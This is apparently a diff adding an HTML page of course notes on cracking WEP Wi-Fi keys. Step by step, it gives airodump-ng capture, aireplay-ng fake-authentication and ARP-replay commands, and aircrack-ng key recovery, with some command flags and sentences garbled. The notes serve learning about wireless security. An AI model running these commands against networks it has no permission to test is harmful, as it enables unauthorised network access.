@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body {
+            height: 100%;
+            width: 100%;
+            background: #f5f6fa;
+        }
+
+        div {
+            color: #67727e;
+            font-size: 20px;
+            padding-left: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div>
+        5..23<br><br>
+
+        WEP cracking<br>
+        Conclusion:<br><br>
+        
+        To crack WEP we need to:<br>
+        1. Capture a large number of packets/IVs. -> using airodump-ng<br>
+        2. Analyse the captured IVs and crack the key -> using aircrack-ng <br><br>
+        
+        Problem:<br>
+        If network is not busy.<br>
+        It would take some time to capture enough IVs.<br><br>
+        
+        Solution:<br>
+        — Force the AP to generate new IVs<br><br>
+        
+        Run <br>
+        airodump-ng mon0<br><br>
+        
+        Sometimes the Data is 0 and unless the data is not increasing we cannot capture IVs<br><br>
+        
+        WEP Cracking<br>
+        Fake Authentication<br>
+        
+        Problem:<br><br>
+        Ads only communicate with connected clients<br>
+        — we can’t communicate with I<br>
+        — we can’t even start the attack<br><br>
+        
+        Solution:<br>
+        — Associate with the AP before launching the attack.<br><br>
+        
+        So do this in one terminal we have to press<br><br>
+        
+        airodump-ng —bssid 64:16:F0:EC:7B:F3 —channel 6 —write arpreplay mon0 <br><br>
+        
+        Here data is 0 so we need to make fake auth attack<br><br>
+        
+        In next terminal<br>
+        aireplay-ng —fakeauth 0 -a  64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br>
+        Before writing more in this we have to go in another terminal<br><br>
+        
+        In next terminal<br>
+        Press Ifconfig mon0 will have unspec with a address  of more than 12 digits copy the first 12 digits with - and remove - with :<br><br>
+        
+        And then go to previous terminal of airplay-ng <br><br>
+        
+        As you do this it will show AUTH - open<br><br>
+        
+        Bssid will have a new station with our mon0 address<br><br>
+        
+        5..24<br><br>
+        
+        WEP Cracking<br>
+        ARP Request Replay<br>
+        1. Wait for an ARP packet<br>
+        2. Capture it and replay it(retransmit it)<br>
+        3. This cause the AP to produce another packet with a newIV<br>
+        4. Keep doing this till we have enough IVs to crack the key<br><br>
+        
+        To do this we hit this command in terminal<br>
+        aireplay-ng —arpreplay -b 64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br><br>
+        
+        In other terminal press again<br>
+        aireplay-ng —fakeauth 0 -a  64:16:F0:EC:7B:F3(BSSID OF network) -h 48:5D:60:2A:12:23 mon0<br><br>
+        
+        We again call<br>
+        aircrack-ng  arpreplay-01.cap <br>
+        This command will crack the password <br>
+        
+
+    </div>
+</body>
+
+</html>
